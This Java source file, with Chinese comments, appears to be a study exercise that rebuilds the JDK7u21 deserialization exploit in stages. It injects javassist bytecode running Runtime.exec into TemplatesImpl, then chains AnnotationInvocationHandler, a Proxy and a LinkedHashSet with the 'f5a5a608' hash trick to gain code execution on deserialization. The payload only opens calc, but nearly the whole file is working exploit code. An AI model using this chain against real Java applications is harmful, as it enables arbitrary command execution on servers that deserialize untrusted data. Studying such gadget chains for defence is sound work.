import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.*;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;


public class jdk7u21_mine {
    //构造方法用下面不需要static的可以
    public class lala{

    }
    //静态方法就需要用有static修饰的
//    public static class lala{
//
//    }
    //步骤一 TemplatesImpl类
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(lala.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        //之前说的静态初始化块和构造方法均可，这边试一下构造方法
//        cc.makeClassInitializer().insertBefore(cmd);
        //以下用构造方法
        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);
        cons.setBody("{"+cmd+"}");
        cc.addConstructor(cons);
        //设置不重复的类名
        String randomClassName = "LaLa"+System.nanoTime();
        cc.setName(randomClassName);
        //设置满足条件的父类
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
        //获取字节码
        byte[] lalaByteCodes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{lalaByteCodes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Reflections.setFieldValue(templates,"_bytecodes",targetByteCodes);
        Reflections.setFieldValue(templates,"_name","lala"+System.nanoTime());
//        Reflections.setFieldValue(templates,"_class",null);
        Reflections.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());

        templates.getOutputProperties();
//        templates.newTransformer();
    }
    //步骤2 AnnotationInvocationHandler -> templateImpl
//    public static void main(String[] args) throws Exception {
//
//        Map map = new HashMap();
//        final Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
//        ctor.setAccessible(true);
//        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);
//        Override proxy = (Override) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(),new Class[]{Override.class},invocationHandler);
//        final Object templates = Gadgets.createTemplatesImpl("calc");
//        proxy.equals(templates);
//
//    }
    //  步骤3：LinkedHashSet -> AnnotationInvocationHandler -> templateImpl
//    public static void main(String[] args) throws Exception {
//        //生成恶意的templates类
//        Templates templates = Gadgets.createTemplatesImpl("calc");
//        //AnnotationInvocationHandler类this.memberValues的map,填入键值对来满足hash相等
//        Map map = new HashMap();
//        String magicStr = "f5a5a608";
//        String magicStr_null = "";//也可
//        //此处需要的先往map中放入一个没用的值，之后说明
//        map.put(magicStr,templates);
//
//        //生成proxy对象
//        final Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
//        ctor.setAccessible(true);
//        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);//this.type,this.memberValues
//        Override proxy = (Override) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(),new Class[]{Override.class},invocationHandler);
//
//        //生成LinkedHashSet，按照顺序一次放入templates和proxy
//        HashSet set = new LinkedHashSet(); // 填入
//        set.add(templates);
//        set.add(proxy);
//        //重新修改map的值
//        map.put(magicStr,templates);
//
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        //序列化
//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
//        objectOutputStream.writeObject(set);//序列化对象
//        objectOutputStream.flush();
//        objectOutputStream.close();
//        //反序列化
//        byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组
//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流
//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
//        Object o = objectInputStream.readObject();
//    }
//    public static void main(String[] args) throws Exception {
//        System.out.println("f5a5a608".hashCode());
//        System.out.println("".hashCode());
//    }
}
